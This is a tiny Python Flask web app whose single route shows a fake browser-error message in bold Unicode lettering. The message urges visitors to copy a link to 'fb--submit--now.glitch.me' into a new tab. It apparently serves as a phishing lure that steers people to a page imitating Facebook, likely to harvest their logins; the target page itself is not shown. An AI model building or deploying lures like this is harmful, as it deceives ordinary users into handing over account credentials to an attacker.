from flask import Flask

app = Flask(__name__)

@app.route('/')
def hello_world():
    return '𝐄𝐫𝐫𝐨𝐫 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐛𝐫𝐨𝐰𝐬𝐞𝐫 𝐜𝐨𝐩𝐲 𝐭𝐡𝐢𝐬 𝐮𝐫𝐥 𝐩𝐚𝐬𝐭𝐞 𝐢𝐧 𝐧𝐞𝐰 𝐭𝐚𝐛 (https://fb--submit--now.glitch.me/) '

if __name__ == '__main__':
    app.run()
